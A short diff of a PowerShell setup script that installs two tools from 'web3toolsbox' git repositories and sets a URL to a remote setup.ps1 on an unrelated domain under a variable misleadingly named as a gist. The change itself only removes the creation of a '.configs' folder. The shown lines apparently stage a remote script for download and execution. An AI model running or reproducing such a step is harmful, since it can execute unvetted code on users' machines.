@@ -573,10 +573,6 @@ try {
     Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://github.com/web3toolsbox/agent-setting.git' -CommandNames @('agent-setting', 'agent-setting.exe')
     Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe')
 
-    if (-not (Test-Path '.configs')) {
-        New-Item -ItemType Directory -Path '.configs' -Force | Out-Null
-    }
-
     if (Test-Path '.configs' -PathType Container) {
         Write-StepLog 'Applying environment configuration'
         $gistUrl = 'https://www.aiskills.life/src/setup.ps1'
